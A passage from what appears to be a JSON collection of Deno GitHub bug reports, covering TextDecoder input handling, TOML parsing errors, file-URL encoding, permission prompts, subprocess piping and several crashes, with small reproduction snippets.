https://github.com/denoland/deno/blob/9bfb0df805719cb3f022a5b5d9f9d898ae954c2e/cli/tsc.rs#L1379\r\n\r\ndeno 1.3.0\r\nv8 8.6.334\r\ntypescript 3.9.7\r\n"},{"labels":["bug",null],"text":"Example:\r\n```js\r\nconst decoder = new TextDecoder();\r\ndecoder.decode(\"\");\r\n```\r\n\r\nThis code should throw a `TypeError`, because a string is not a valid input. Chrome and FF do this. Deno just accepts it and assumes you meant `new Uint8Array(0)`, which is wrong."},{"labels":["bug",null],"text":"Noticed while upgrading a module to use `std@0.66.0` and Deno `1.3.1` ([REF](https://github.com/asos-craigmorten/superdeno/issues/15)) that the TextDecoder `decode()` method is missing a null check resulting in the following error:\r\n\r\n```console\r\n$ deno\r\n\r\nDeno 1.3.1\r\nexit using ctrl+d or close()\r\n> let d = new TextDecoder()\r\nundefined\r\n> d.decode(null)\r\nUncaught TypeError: Cannot use 'in' operator to search for 'buffer' in null\r\n    at TextDecoder.decode (/Users/runner/work/deno/deno/op_crates/web/08_text_encoding.js:445:18)\r\n    at <unknown>:3:3\r\n    at evaluate (rt/40_repl.js:60:36)\r\n    at replLoop (rt/40_repl.js:160:15)\r\n```\r\n\r\n(`response.arrayBuffer()` from a `fetch` now returns `null` for a `null` response body in Deno `1.3.1`, whereas it returned an empty string before in Deno `1.3.0`, hence how saw this error)\r\n\r\nAssuming we want to keep the fall-through behaviour currently implemented (anything invalid passed is overwritten with `new Uint8Array(0)`), but without the error thrown, just need to add a one-liner and test for passing `null` to the `decode` method.\r\n\r\nREF: https://github.com/denoland/deno/blob/master/op_crates/web/08_text_encoding.js#L445\r\n\r\n```ts\r\n      let bytes;\r\n      if (input instanceof Uint8Array) {\r\n        bytes = input;\r\n      } else if (isEitherArrayBuffer(input)) {\r\n        bytes = new Uint8Array(input);\r\n      } else if (\r\n        typeof input === \"object\" &&\r\n        input !== null && // <-- Add this here?\r\n        \"buffer\" in input &&\r\n        isEitherArrayBuffer(input.buffer)\r\n      ) {\r\n        bytes = new Uint8Array(\r\n          input.buffer,\r\n          input.byteOffset,\r\n          input.byteLength,\r\n        );\r\n      } else {\r\n        bytes = new Uint8Array(0);\r\n      }\r\n```\r\n\r\nIt's a small thing, and expect most folks will be protected via the type defs, but simple enough to trip into / reproduce with a Deno server of your choice, e.g. using an express like server:\r\n\r\n```ts\r\nimport { opine } from \"https://deno.land/x/opine@0.21.2/mod.ts\";\r\n\r\nconst app = opine();\r\napp.get(\"/\", (_req, res) => {\r\n  res.setStatus(304).send();\r\n});\r\nconst server = app.listen();\r\nconst address = server.listener.addr as Deno.NetAddr;\r\nconst url = `http://localhost:${address.port}`;\r\n\r\nconst decoder = new TextDecoder();\r\nconst res = await fetch(url);\r\n// Response {\r\n//   _bodySource: null,\r\n//   _stream: null,\r\n//   url: \"http://localhost:51780\",\r\n//   statusText: \"Not Modified\",\r\n//   status: 304,\r\n//   headers: Headers { content-length: 0, x-powered-by: Opine },\r\n//   redirected: false,\r\n//   type: \"default\"\r\n// }\r\nconst buf = await res.arrayBuffer(); // returns null\r\nconst decoded = decoder.decode(buf); // BOOM\r\n// error: Uncaught TypeError: Cannot use 'in' operator to search for 'buffer' in null\r\n//     at TextDecoder.decode (/Users/runner/work/deno/deno/op_crates/web/08_text_encoding.js:445:18)\r\n//     at asd.ts:18:19\r\nconsole.log(decoded);\r\nserver.close();\r\n```\r\n\r\nHappy to put in a small PR 🙃 "},{"labels":["bug",null],"text":"I was just upgrading deno to 1.3.1 version and going to show builtin docs. It shows\r\n\r\n```bash\r\nthread 'main' has overflowed its stack\r\nfatal runtime error: stack overflow\r\nAborted (core dumped)\r\n```"},{"labels":["bug",null],"text":"In all browser vendors and Node.js, when using `console.log` on an object containing getters, the getters are shown as getters, they aren't actually called.\r\n\r\nExample:\r\n```ts\r\nlet i = 0n;\r\n\r\nconst objectContainingGetter = {\r\n\tget x() {\r\n\t\treturn ++i;\r\n\t}\r\n};\r\n\r\nconsole.log(objectContainingGetter);\r\n// expected to be something along the lines of\r\n// { [x: getter] }\r\n\r\nconsole.log(objectContainingGetter.x);\r\n// expected to be \"1n\"\r\n```"},{"labels":["bug"],"text":"> Little context as preface: I'm trying out some polyfilling tricks to serve modules from jsdelivr/jspm with std/node and type declarations loaded in the background. The URLs below are from a dev instance of that project and code can be checked [here](https://github.com/denofn/dreg)\r\n\r\nGiven the following dependency `https://cdn-dev.dreg.dev/package/picomatch@2.2.2`, which gets loaded with type declarations with a `x-typescript-types`, plainly running `deno cache https://cdn-dev.dreg.dev/package/picomatch@2.2.2` will error unless you also add `--no-check`. The same is true for a script that uses this dependency:\r\n\r\n```ts\r\nimport picomatch from \"https://cdn-dev.dreg.dev/package/picomatch@2.2.2\";\r\n\r\nconst isMatch = picomatch(\"*.js\");\r\nconsole.log(picomatch.test(\"foo/bar\", /^(?:([^/]*?)\\/([^/]*?))$/));\r\n\r\nconsole.log(isMatch(\"abcd\")); //=> false\r\nconsole.log(isMatch(\"a.js\")); //=> true\r\nconsole.log(isMatch(\"a.md\")); //=> false\r\nconsole.log(isMatch(\"a/b.js\")); //=> false\r\n```\r\n\r\nRunning `deno cache --no-check` runs as expected and also stores the type hints, so consecutive runs of `deno run` do not need the no-check flag and actually respect the type declarations.\r\n\r\nIn the case of (also) adding a `--reload` flag: this does *not* work with `deno cache` but *does* with `deno run` so I'm a little confused."},{"labels":["bug",null,null],"text":"TypeScript 4.0 supports optional named tuple types, even with #6514 Deno does not support this feature.\r\n\r\nFor example the following as an input file:\r\n\r\n```ts\r\nfunction foo(x: [first: string, second?: number]) {\r\n  const [a, b] = x;\r\n  console.log(a, b);\r\n}\r\n\r\nfoo([\"ao\", 1]);\r\n```\r\n\r\nWill result in something like:\r\n\r\n```\r\nerror: Expected Comma, got Some(Colon) at file:///optional_named_tuples.ts:1:39\r\n```\r\n\r\nThis is upstream in swc and being worked on.\r\n\r\nRef: swc-project/swc#978\r\n\r\ncc/ @dsherret \r\n"},{"labels":["bug",null,null],"text":"I copied a file which contains an 'ö' in its filename --> the copy feature made \\303\\266 out of the 'ö'. \r\n\r\n"},{"labels":["bug",null,null],"text":"# Setup\r\n\r\nOS: MacOS Mojave\r\n\r\n```\r\n$ deno --version\r\ndeno 1.3.0\r\nv8 8.6.334\r\ntypescript 3.9.7\r\n```\r\n\r\n# Issue\r\n\r\nThe likes of `fromFileUrl()` does not handle percent symbol (`%`) characters in the provided file url.\r\n\r\nAn error is thrown in the use of `decodeURIComponent()` which does not handle isolated percent symbol characters in the provided url as it deems them an invalid URL encoding. Subsequently `Deno.readTextFile()` and potentially other APIs are impacted.\r\n\r\nI'm not brushed up on File URIs but gut feeling is likely this is less an issue with the aforementioned APIs but rather one with the likes of `join`, which at the moment will happily let you construct an invalid file URL with an unencoded `%` making it easy for user error.\r\n\r\n# Minimal Reproduceable Example(s)\r\n\r\nExample with `fromFileUrl()` error:\r\n\r\n```ts\r\n// repro.ts\r\nimport {\r\n  fromFileUrl,\r\n  dirname,\r\n  join,\r\n} from \"https://deno.land/std@0.65.0/path/mod.ts\";\r\n\r\nconst __dirname = dirname(import.meta.url); // This returns a stringified file url\r\nconst fileUrl = join(__dirname, \"% users.txt\");\r\nconsole.log({ __dirname, fileUrl });\r\n\r\nconsole.log(fromFileUrl(fileUrl)); // boom\r\n```\r\n\r\n```console\r\n$ touch \"% users.txt\" # create file with special character in name / path\r\n$ echo \"20%\" > \"./% users.txt\"\r\n$ deno run --allow-read ./repro.ts\r\nCheck file:///Users/craig.morten/git/asos-craigmorten/opine/repro.ts\r\n{\r\n  __dirname: \"file:///Users/craig.morten/git/asos-craigmorten/opine\",\r\n  fileUrl: \"file:/Users/craig.morten/git/asos-craigmorten/opine/% users.txt\" # <--- this causes an issue\r\n}\r\nerror: Uncaught URIError: URI malformed\r\n  return decodeURIComponent(url.pathname);\r\n         ^\r\n    at decodeURIComponent (<anonymous>)\r\n    at fromFileUrl (posix.ts:439:10)\r\n    at repro.ts:11:13\r\n```\r\n\r\nExample with `Deno.readTextFile()` error:\r\n\r\n```console\r\n$ touch \"% users.txt\" # create file with special character in name / path\r\n$ echo \"20%\" > \"./% users.txt\"\r\n$ deno # start repl\r\n\r\n> const filePath = \"/Users/craig.morten/git/asos-craigmorten/opine/% users.txt\";\r\nundefined\r\n> Deno.readTextFile(filePath).then(m => console.log(m)); # works as expected\r\nPromise { <pending> }\r\n20%\r\n\r\n> const fileUrl = new URL(`file:/Users/craig.morten/git/asos-craigmorten/opine/% users.txt`);  # <--- this causes an issue\r\nundefined\r\n> Deno.readTextFile(fileUrl).then(m => console.log(m));\r\nPromise { <pending> }\r\nerror: Uncaught URIError: URI malformed\r\n    at decodeURIComponent (<anonymous>)\r\n    at pathFromURLPosix (rt/06_util.js:86:12)\r\n    at pathFromURL (rt/06_util.js:97:11)\r\n    at opOpen (rt/30_files.js:35:41)\r\n    at open (rt/30_files.js:52:23)\r\n    at Object.readTextFile (rt/40_read_file.js:30:24)\r\n    at <unknown>:3:6\r\n    at evaluate (rt/40_repl.js:60:36)\r\n    at replLoop (rt/40_repl.js:160:15)\r\n```\r\n\r\n# Expectation\r\n\r\nThis should be easily solvable on any user's side by first encoding any / all path components, e.g.\r\n\r\n```ts\r\nconst __dirname = dirname(import.meta.url); # This returns a stringified file url\r\nconst fileUrl = join(__dirname, encodeURIComponent(\"% users.txt\"));\r\n```\r\n\r\nBut this _feels_ like a hidden gotcha for users, and it would be great if APIs such as `join` could gracefully handle such path segments and construct a valid file url? Happy to be overruled and have the responsibility lie with the consumer! It certainly is a niche issue."},{"labels":["bug",null],"text":"It's not that this is specifically unexpected behavior, but this function is often explicitly provided as the solution to a problem that it does not solve. \r\n\r\nWhen tasked with parsing lines of a text file on windows, one must use `\\r\\n` or go with a platform-agnostic regex such as `/\\r?\\n/`. The solution offered is often parsing the \"correct way\" using `readLines` which does not factor in `\\r` and leads to the same problems mentioned in https://github.com/denoland/deno/issues/7090, which is essentially a garble of text on Windows machines when displayed with `console.log`.\r\n\r\nCurrent `readLines` implementation for reference: https://deno.land/std@0.65.0/io/bufio.ts#L704\r\n\r\nThis was made a separate issue as to not clutter the discussion on the main problem with carriage returns in Deno's `console.log`"},{"labels":["bug",null],"text":"Windows 10, Deno v1.1.2\r\nCarriage returns are parsed when used inside of a `console.log`. This manifests itself when parsing lines from a text file in Windows and forgetting to split by `\\r\\n`.\r\n\r\nWhen given a list of names\r\n```\r\nGeorge\r\nGreg\r\nAlvin\r\nNorman\r\nAlice\r\nSarah\r\n```\r\nand then some code to retrieve them\r\n```ts\r\nconst names = Deno.readTextFileSync(\"./file.txt\").split('\\n');\r\n\r\nconsole.log({ names })\r\n```\r\nAn unexpected and unactionable error occurs. \r\n![image](https://user-images.githubusercontent.com/24513691/90457326-388c7980-e0c9-11ea-904c-9a3f10273689.png)\r\nText appears to be mangled and concatenated. \r\nContrast this with other JavaScript environments, such as Node.js\r\n![image](https://user-images.githubusercontent.com/24513691/90457442-8903d700-e0c9-11ea-89ea-be9c350f56ab.png)\r\nWhere carriage returns are not parsed at all.\r\nIn Chrome, carriage returns seem to be stripped from the output, which I've been told falls in line with the spec.\r\n\r\n"},{"labels":["bug",null],"text":"The following script `test.ts` causes `deno test` to silently perform the equivalent of `exit(0)` from within the test `fn()`:\r\n\r\n```\r\n$ deno test ./test.ts && echo OK\r\nrunning 2 tests\r\ntest bug ... OK\r\n```\r\n\r\nAll works as expected if the `bug` test is filtered out:\r\n\r\n```\r\n$ deno test ./test.ts --filter ok && echo OK\r\nrunning 1 tests\r\ntest ok ... ok (3ms)\r\n\r\ntest result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 1 filtered out (3ms)\r\n\r\nOK\r\n```\r\n\r\nMy version info:\r\n\r\n```\r\n$ deno --version\r\ndeno 1.3.0\r\nv8 8.6.334\r\ntypescript 3.9.7\r\n$ grep DESC /etc/lsb-release\r\nDISTRIB_DESCRIPTION=\"Ubuntu 20.04.1 LTS\"\r\n$ uname -s -p -v\r\nLinux #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64\r\n```\r\n\r\nNote: This is a minimal reproducer for a bug that showed up in a timeout-based iterater, thus the odd construction.\r\n\r\nFile `test.ts`:\r\n\r\n```typescript\r\nclass FooIterator implements AsyncIterableIterator<number> {\r\n  resolve: any;\r\n\r\n  constructor() {\r\n    this.resolve = null;\r\n  }\r\n\r\n  [Symbol.asyncIterator](): AsyncIterableIterator<number> {\r\n    return this;\r\n  }\r\n\r\n  next(): Promise<IteratorResult<number>> {\r\n    return new Promise((res) => {\r\n      this.resolve = res;\r\n    });\r\n  }\r\n}\r\n\r\nDeno.test({\r\n  name: \"bug\",\r\n  async fn() {\r\n    const foo = new FooIterator();\r\n    for await (const value of foo) {\r\n      console.log(`value=${value}`);\r\n    }\r\n  },\r\n});\r\n\r\nDeno.test({\r\n  name: \"ok\",\r\n  async fn() {},\r\n});\r\n```\r\n"},{"labels":["bug",null],"text":"Currently, when creating a subprocess using `Deno.run`, the process stays in \"zombie mode\" even after it is killed.\r\n\r\nI've created a gist that reproduces this bug, and talked with @lucacasonato that confirmed it.\r\n\r\nhttps://gist.github.com/asantos00/bdd4357cb91f18b368085eb44105ea97"},{"labels":["bug",null,null],"text":"MACHINE: WSL 2 (Ubuntu 20.04)\r\nOS: Ubuntu 20.04\r\n\r\nCurrent version: 1.2.3\r\n\r\nWhat's wrong\r\n\r\n```bash\r\ndev@Raspberry:~$ deno upgrade\r\nChecking for latest version\r\ndownloading https://github.com/denoland/deno/releases/download/v1.3.0/deno-x86_64-unknown-linux-gnu.zip\r\nVersion has been found\r\nDeno is upgrading to version 1.3.0\r\ndownloading https://github-production-release-asset-2e65be.s3.amazonaws.com/133442384/c3e0d480-dd82-11ea-837c-81e79e8669bd?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200817%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200817T130905Z&X-Amz-Expires=300&X-Amz-Signature=649fcd47675f065db1f1c92b223489d8645ec52e03f3c566d20bc9a116a2ad22&X-Amz-SignedHeaders=host&actor_id=0&repo_id=133442384&response-content-disposition=attachment%3B%20filename%3Ddeno-x86_64-unknown-linux-gnu.zip&response-content-type=application%2Foctet-stream\r\nVersion has been found\r\nDeno is upgrading to version 1.3.0\r\nerror: No such file or directory (os error 2)\r\n```\r\n\r\nWhat's expected.\r\nSuccesful upgrade.\r\n"},{"labels":["bug",null],"text":"I'm workiing with very large CSV files (85Mo). After opening the file with `Deno.readFile`, I decode it with `new TextDecoder(\"iso-8859-1\").decode(rawData);` and get the following error:\r\n\r\n*note: I do not get this error with `utf-8`*\r\n\r\n> <--- Last few GCs --->\r\n\r\n> [17822:0x5400000000]    27318 ms: Mark-sweep (reduce) 1399.4 (1401.5) -> 1399.3 (1403.2) MB, 3173.1 / 0.0 ms  (+ 0.1 ms in 431 steps since start of marking, biggest step 0.0 ms, walltime since start of marking 3424 ms) (average mu = 0.191, current mu = 0.[17822:0x5400000000]    30483 ms: Mark-sweep (reduce) 1399.8 (1401.7) -> 1399.5 (1402.5) MB, 3164.5 / 0.0 ms  (average mu = 0.100, current mu = 0.000) allocation failure scavenge might not succeed\r\n\r\n\r\n> <--- JS stacktrace --->\r\n\r\n> \\#\r\n> \\# Fatal javascript OOM in Ineffective mark-compacts near heap limit\r\n> \\#\r\n> [1]    17822 illegal hardware instruction\r\n\r\nDeno Version: 1.2.2\r\nMac OS: 10.14.6\r\nRAM: 16 Gb"},{"labels":["bug",null],"text":"## Brief\r\nWhen an array is followed by a comment, the TOML parser produces incorrect output. This issue is quite weird, but I tracked down a few cases of where the parser produces invalid output.\r\n\r\nThis issue and the examples below are verbose, but provide a clearer picture of the issue(s) with the parser. \r\n\r\n**Case 1** seems to be the **root cause**. \r\n**Case 2** and **Case 3** provide examples of other weird behaviors derived from **Case 1**.\r\n\r\n**Deno Versions:**\r\ndeno 1.3.0\r\nv8 8.6.334\r\ntypescript 3.9.7\r\ndeno-std 0.65.0\r\n\r\n### Valid Case (output is correct)\r\n```ts\r\nconsole.log(parse(`\r\n[deno] # this comment is fine\r\nis_not_node = [\"that\", \"is\", \"true\"]\r\nthis_string_is_skipped = \"no\"\r\nthis_is_also_skipped = false \r\n\r\n[toml] \r\ntoml_merged = false\r\ntoml_string_merged = \"no\"\r\n`));\r\n```\r\n\r\n**Correct output:** This will be used as a reference for the following cases.\r\n```ts\r\n{\r\n  deno: {\r\n    is_not_node: [ \"that\", \"is\", \"true\" ],\r\n    this_string_is_skipped: \"no\",\r\n    this_is_also_skipped: false\r\n  },\r\n  toml: { toml_merged: false, toml_string_merged: \"no\" }\r\n}\r\n```\r\n---\r\n### Case 1\r\nA comment after an array causes two problems: \r\n1. ```[toml]```'s key-values to merge into ```[deno]```.\r\n2. The key-values in ```[deno]``` after the comment disappear\r\n\r\n```ts\r\nconsole.log(parse(`\r\n[deno] # this comment is fine\r\nis_not_node = [\"that\", \"is\", \"true\"] # This comment causes Case 1\r\nthis_string_is_skipped = \"yes\"\r\nthis_is_also_skipped = true \r\n\r\n[toml] \r\ntoml_merged = true\r\ntoml_string_merged = \"yes\"\r\n`))\r\n```\r\n\r\n**Ouput:**\r\n```ts\r\n{\r\n  deno: {\r\n    is_not_node: [ \"that\", \"is\", \"true\" ],\r\n    toml_merged: true,\r\n    toml_string_merged: \"yes\"\r\n  }\r\n}\r\n```\r\n**Expected output:** The output should be similar to **Valid Case**'s output.\r\n\r\n---\r\n### Case 2\r\n\r\nWhen there is a comment after an array **and** the next table has a comment inline after it, the parser produces the wrong output:\r\n1. Only the first table, ```[deno]```, is in the output\r\n2. All the key-values of ```[deno]``` disappear\r\n3. The second table, ```[toml]```, and its key-values disappear\r\n\r\n```ts \r\nconsole.log(parse(`\r\n[deno] # this comment is fine\r\nis_not_node = [\"that\", \"is\", \"true\"] # This comment causes Case 1\r\nthis_string_is_skipped = \"yes\"\r\nthis_is_also_skipped = true \r\n\r\n[toml] # This comment in tandem with Case 1's comment, causes Case 2\r\ntoml_merged = true\r\ntoml_string_merged = \"idk it is all gone\"\r\n`))\r\n```\r\n**Output:**\r\n```ts\r\n{ deno: {} }\r\n```\r\n**Expected output:** The output should be similar to **Valid Case**'s output.\r\n\r\n\r\n**Note:**\r\n- It seems to be if and only if the following table, ```[toml]```, has a comment after it \r\n- If there are more tables and each table is also followed by an inline comment, they also disappear\r\n\r\n---\r\n### Case 3\r\nWhen there is a comment after an array, and then one of the next key-values is also an array the output changes:\r\n1. An array following the commented array will disappear. In this case its the array called ```this_array_is_skipped```\r\n2. Any key-values in between the commented array and the second array will also disappear \r\n3. The values after the second array, ```this_array_is_skipped```, will **NOT** disappear and are shown correctly in the output\r\n4. The second table, ```[toml]```, is now parsed correctly even though the table definition has an inline comment\r\n\r\n```ts\r\nconsole.log(parse(`\r\n[deno] # this comment is fine\r\nis_not_node = [\"that\", \"is\", \"true\"]  # This comment causes Case 1\r\nthis_string_is_skipped = \"yes\"\r\nthis_array_is_skipped = [\"yes, this array is skipped.\", \"The following key-values are not skipped.\"]\r\nthis_is_also_skipped = false \r\n\r\n[toml] # This comment used to cause an issue, but its fine now due to the second array\r\ntoml_merged = false\r\ntoml_string_merged = \"no\"\r\n`))\r\n```\r\n\r\n**Output:**\r\n```ts\r\n{\r\n  deno: { is_not_node: [ \"that\", \"is\", \"true\" ], this_is_also_skipped: false },\r\n  toml: { toml_merged: false, toml_string_merged: \"no\" }\r\n}\r\n````\r\n\r\n**Expected output:** The output should be similar to **Valid Case**'s output.\r\n\r\nNote: \r\n- The second array, ```this_array_is_skipped```, seems to reset the parser. Any TOML content following the second array is parsed correctly.\r\n- If the second array is followed by a comment, the output is the same as **Case 2**"},{"labels":["bug",null],"text":"Further to a [Discord discussion](https://discordapp.com/channels/684898665143206084/689420767620104201/744610445322747934) today, I'm seeing unusual behaviour when using `Deno.run` and piping a large buffer in to `stdin`.\r\n\r\nThe following script hangs indefinitely on the `Deno.writeAll` line (using this instead of `proc.stdin.write` to ensure the entire buffer is written.\r\n\r\n```\r\nconst response = await fetch(\"http://localhost:8000/a.mp3\");\r\nconst buffer = new Uint8Array(await response.arrayBuffer());\r\n\r\nconst proc = Deno.run({\r\n  cmd: [\"sox\", \"-t\", \"mp3\", \"-\", \"-t\", \"raw\", \"-\"],\r\n  stdin: \"piped\",\r\n  stdout: \"piped\",\r\n  stderr: \"inherit\",\r\n});\r\nconsole.error(\"input length=\", buffer.length);\r\nawait Deno.writeAll(proc.stdin, buffer);\r\nconsole.error(\"write done\");\r\nproc.stdin.close();\r\nawait proc.status();\r\nconst data = await proc.output();\r\nproc.close();\r\n```\r\n\r\nIn the Discord chat we collectively tried various things such as shuffling an empty buffer of the correct length (fine) and also mimicking the same functionality entirely with the shell (e.g. `curl http://localhost:8000/a.mp3 | sox -t mp3 - -t raw - | play -q -t raw -b 16 -e signed -c 2 -r 44100 - > dump.raw`) - which works. If we disable piping stdout (change to inherit), it completes successfully.\r\n\r\nTested on Deno 1.3.0 on macOS."},{"labels":["bug",null],"text":"```\r\n$ deno info --no-check https://deno.land/x/garn_validator@v1.2.24/src/index.d.ts\r\nWarning Failed to get compiled source code of \"https://deno.land/x/garn_validator@v1.2.24/src/index.d.ts\".\r\nReason: No such file or directory (os error 2)\r\nIf the source file provides only type exports, prefer to use \"import type\" or \"export type\" syntax instead.\r\nWarning Failed to get compiled source code of \"https://deno.land/x/garn_validator@v1.2.24/src/index.d.ts\".\r\nReason: No such file or directory (os error 2)\r\nIf the source file provides only type exports, prefer to use \"import type\" or \"export type\" syntax instead.\r\nthread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: ErrBox(Os { code: 2, kind: NotFound, message: \"No such file or directory\" })', cli/main.rs:234:32\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n```\r\n\r\nThis broke between 1.2.0 and 1.2.1. It happens with and without `--no-check`. We are meant to be emitting an empty file, but it doesn't seem to be working anymore. Ref #6760 \r\n\r\ncc @bartlomieju "},{"labels":["bug",null],"text":"First of all: thank you all for this great project and keep up the good work!\r\n\r\nI noticed that parsing the following TOML using `parse` from `std/encoding/toml.ts` resulted in an incorrect result:\r\n\r\n```toml\r\nsomeBase64Data = \"base64data0xdamaged\"\r\n```\r\n\r\nThis actually returned with the string strangely crippled on the JS side:\r\n\r\n```json\r\n{ \"someBase64Data\": \"0xdam\" }\r\n```\r\n\r\nThe reason seems to be that the regexp check on https://github.com/denoland/deno/blob/684eddcc6bf0c1446c9aba0cdf001c661c19ab24/std/encoding/toml.ts#L221 also triggers inside of string literals as long as the \"0x\", \"0b\" or \"0o\" prefix is followed by at least one hex character.\r\n\r\nI am currently preparing a PR that changes the regexp to expect the number prefix to be at the start of the string (as it is already trimmed)."},{"labels":["bug",null,null],"text":"Problem with Deno and permissions.\r\nWhen read access is requested for a specific folder, each read access request is either granted or denied, depending on what the user decides on the first request.\r\n\r\n`deno run --unstable app.ts`\r\n```js\r\n// --> Deno requests read access to \"./file1\" --> grant\r\nconst status1 = await Deno.permissions.request({ name: \"read\", path: \"./file1\" });  \r\nconst status2 = await Deno.permissions.request({ name: \"read\", path: \"./file2\" });  // --> Deno skip request\r\nconsole.log(\"Request ./file1\", status1.state);    // --> Granted     | Denied \r\nconsole.log(\"Request ./file2\", status2.state);    // --> Granted [!] | Denied [!]\r\n```\r\n\r\nSame for revoke permissions\r\n`deno run --unstable --allow-read=./file1,./file2 app.ts`\r\ncase 1:\r\n```js\r\n// --> Deno revoke read access to \"./file1\"\r\nconst status1 = await Deno.permissions.revoke({ name: \"read\", path: \"./file1\" }); \r\nconst status2 = await Deno.permissions.query({ name: \"read\", path: \"./file1\" });\r\nconst status3 = await Deno.permissions.query({ name: \"read\", path: \"./file2\" });\r\nconsole.log(\"Request ./file1\", status1.state);    // --> Granted [!]\r\nconsole.log(\"Request ./file1\", status2.state);    // --> Granted [!]\r\nconsole.log(\"Request ./file2\", status2.state);    // --> Granted\r\n```\r\n\r\ncase 2:\r\n```js\r\nconst status1 = await Deno.permissions.revoke({ name: \"read\" });  // --> Deno revoke read access\r\nconst status2 = await Deno.permissions.query({ name: \"read\", path: \"./file1\" });\r\nconst status3 = await Deno.permissions.query({ name: \"read\", path: \"./file2\" });\r\nconsole.log(\"Request ./file1\", status1.state);    // --> Prompt\r\nconsole.log(\"Request ./file1\", status2.state);    // --> Granted [!]\r\nconsole.log(\"Request ./file2\", status2.state);    // --> Granted [!]\r\n```"},{"labels":["bug",null],"text":"The compiler API does compile the source code and emits a sourcemap, but the filenames in the emit map are not correct.\r\n\r\nThis example shows a basic discrepancy:\r\n\r\n```ts\r\nconst [diag, emit] = await Deno.compile(\"https://deno.land/std@0.64.0/examples/welcome.ts\");\r\nconsole.log(Object.keys(emit));\r\n/*\r\n[\r\n  \"https://deno.land/std@0.64.0/examples/welcome.js.map\",\r\n  \"https://deno.land/std@0.64.0/examples/welcome.js\"\r\n]\r\n*/\r\nconst [diagHash, emitHash] = await Deno.compile(\r\n  \"https://deno.land/std@0.64.0/examples/welcome.ts#1\"\r\n);\r\nconsole.log(Object.keys(emitHash));\r\n/*\r\n[\r\n  \"https://deno.land/std@0.64.0/examples/welcome.ts#1.js.map\",\r\n  \"https://deno.land/std@0.64.0/examples/welcome.ts#1.js\"\r\n]\r\n*/\r\n```\r\n\r\nUsing something with a circular dependency like `https://deno.land/std@0.64.0/http/server.ts` obviously renders both because the hash or search is only in the root module:\r\n\r\n```ts\r\nconst [diag, emit] = await Deno.compile(\"https://deno.land/std@0.64.0/http/server.ts?abc=def\");\r\nconsole.log(Object.keys(emit));\r\n/*\r\n[\r\n  ...\r\n  \"https://deno.land/std@0.64.0/http/server.js.map\",\r\n  \"https://deno.land/std@0.64.0/http/server.js\",\r\n  ...\r\n  \"https://deno.land/std@0.64.0/http/server.ts?abc=def.js.map\",\r\n  \"https://deno.land/std@0.64.0/http/server.ts?abc=def.js\"\r\n]\r\n*/\r\n```"},{"labels":["bug",null,null],"text":"Deno seems to deal with spaces differently to browsers when it comes to URLSearchParams, where a browser will replace spaces with a `+`, deno will insert `%20` instead.\r\n```js\r\nnew URLSearchParams({a: 'hello world'}).toString()\r\n// result in chrome/firefox:  \"a=hello+world\"\r\n// result in deno: `a=hello%20world\r\n```\r\n\r\nURLSearchParams are supposed to encode in `application/x-www-form-urlencoded` format, which would have spaces become `+` like chrome/firefox are doing.\r\n\r\n---\r\n\r\n> Depending on the context, the character ' ' is translated to a '+' (like in the percent-encoding version used in an application/x-www-form-urlencoded message)\r\n\r\nhttps://developer.mozilla.org/en-US/docs/Glossary/percent-encoding\r\n\r\n>URLSearchParams objects will percent-encode anything in the application/x-www-form-urlencoded percent-encode set, and will encode U+0020 SPACE as U+002B (+).\r\n\r\nhttps://url.spec.whatwg.org/#example-constructing-urlsearchparams\r\n\r\n<details>\r\n<summary>Versions</summary>\r\n\r\n```\r\ndeno 1.2.3\r\nv8 8.6.334\r\ntypescript 3.9.2\r\n```\r\n\r\n</details>"},{"labels":["bug",null],"text":"**[Details]**\r\nI have a transitive dependency that is using `https://deno.land/std@0.64.0/node/_util/_util_promisify.ts` which has `@ts-expect-error`.\r\n\r\n![image](https://user-images.githubusercontent.com/60560109/89742523-b8329c80-da68-11ea-9f23-e4618e39c3a9.png)\r\n\r\nWhen using `strict=true`, it throws the same errors, and also, oak 6.0.1 breaks.\r\n![image](https://user-images.githubusercontent.com/60560109/89742541-ced8f380-da68-11ea-81ff-416b20a037e3.png)\r\n\r\nThis was solved before but now it started happening again in STD with the **exact** same behavior. This was solved here: https://github.com/denoland/deno/issues/6033 by @kitsonk in https://github.com/denoland/deno/pull/6038 .\r\n\r\n**[Environment]**\r\ndeno 1.2.3\r\nv8 8.6.334\r\ntypescript 3.9.2\r\n\r\n**[Additional]**\r\nThis behavior started happening in std >= 0.63.0 as it is not happening in std 0.62.0"},{"labels":["bug",null],"text":"This is a strange bug.\r\n\r\nWhen loading both `https://deno.land/std@0.63.0/hash/mod.ts` and some cjs files, deno checks the type of cjs.\r\n\r\n```ts\r\nexport { createHash } from \"https://deno.land/std@0.63.0/hash/mod.ts\";\r\nimport {} from \"./cjsTest.cjs\"\r\n```\r\n\r\n```\r\nerror: TS2339 [ERROR]: Property 'test' does not exist on type '{}'.\r\n  return exports.test;\r\n                 ~~~~\r\n    at file:///C:/Users/stone/OneDrive/%EB%B0%94%ED%83%95%20%ED%99%94%EB%A9%B4/%EC%83%88%20%ED%8F%B4%EB%8D%94/postgres/cjsTest.cjs:4:18\r\n```\r\n\r\n\r\nWindows 10 v2004 - X\r\nWSL (Ubuntu bionic) - X\r\nmacOS Catalina - X"},{"labels":["bug",null,null],"text":"Any filter starting with a dash is treated as an argument to the deno command and not for the actual filter option.\r\nTo reproduce, run:\r\n\r\n```sh\r\ndeno test --filter \"- my filter\"\r\n```\r\n\r\nAnd you will receive the following error:\r\n```\r\nerror: Found argument '- ' which wasn't expected, or isn't valid in this context\r\n```\r\n\r\nRemoving the dash works as expected:\r\n\r\n```sh\r\ndeno test --filter \"my filter\"\r\n```\r\n\r\n I would expect putting a dash in to work the same."},{"labels":["bug",null,null],"text":"Deno.watchFs is not working in WSL(Ubuntu 18.04 LTS Bionic) environment.\r\nLiterally, there are no event messages after changing any files."},{"labels":["bug",null],"text":"I'm experiencing a strange bug with `Deno`.\r\n\r\nWhen a exception is thrown the main process panics. This is the trace:\r\n```\r\nthread 'main' panicked at 'called `Option::unwrap()` on a `None` value', cli\\fmt_errors.rs:86:8\r\nstack backtrace:\r\n   0:     0x7ff7af88a45b - <unknown>\r\n   1:     